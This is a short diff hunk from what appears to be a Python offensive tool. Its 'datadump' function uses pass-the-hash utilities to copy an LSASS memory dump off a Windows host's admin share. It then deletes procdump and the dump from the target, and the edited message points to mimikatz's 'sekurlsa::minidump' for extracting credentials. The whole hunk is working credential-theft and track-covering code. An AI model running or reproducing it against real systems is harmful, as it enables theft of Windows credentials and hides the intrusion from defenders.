@@ -148,7 +148,7 @@ def datadump(user, passw, host, path, os_version):
 					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get lsass.dmp\' 2>/dev/null")
 					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\procdump.exe && del c:\\lsass.dmp\" 2>/dev/null")
 					if os.path.isfile(outputpath+host+"/lsass.dmp"):
-						print colored("[+]lsass.dmp file found",'green')
+						print colored("[+]lsass.dmp file found - run sekurlsa::minidump",'green')
 					else:
 						print colored("[-]lsass.dmp file not found",'red')        
 				except OSError:
